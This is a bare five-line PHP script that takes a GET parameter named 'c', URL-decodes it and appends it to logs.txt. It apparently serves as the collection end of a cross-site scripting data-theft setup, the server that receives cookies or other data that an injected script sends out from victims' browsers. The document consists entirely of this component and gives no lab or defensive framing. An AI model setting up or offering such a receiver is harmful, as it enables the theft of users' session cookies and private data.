<?php
	if(isset($_GET['c'])) {
		file_put_contents('logs.txt', urldecode($_GET['c']), FILE_APPEND);
	}
?>